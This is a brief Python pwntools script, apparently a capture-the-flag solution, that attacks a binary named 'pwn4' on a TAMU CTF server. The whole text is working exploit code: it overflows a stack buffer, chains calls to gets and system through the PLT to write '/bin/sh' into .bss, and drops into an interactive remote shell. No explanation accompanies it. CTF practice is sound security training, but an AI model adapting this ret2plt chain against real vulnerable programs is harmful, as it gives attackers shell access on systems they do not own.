from pwn import *

s = remote('pwn.ctf.tamu.edu', 4324)
e = ELF('./pwn4')

gets_plt = e.plt['gets']
system_plt = e.plt['system']

pr = 0x0804880b

payload = "A"*(0x1C+4)

payload += p32(gets_plt)
payload += p32(pr)
payload += p32(e.bss())

payload += p32(system_plt)
payload += "AAAA"
payload += p32(e.bss())


s.sendlineafter("Input> ", payload)

s.sendline("/bin/sh\x00")

sleep(0.2)
s.interactive()
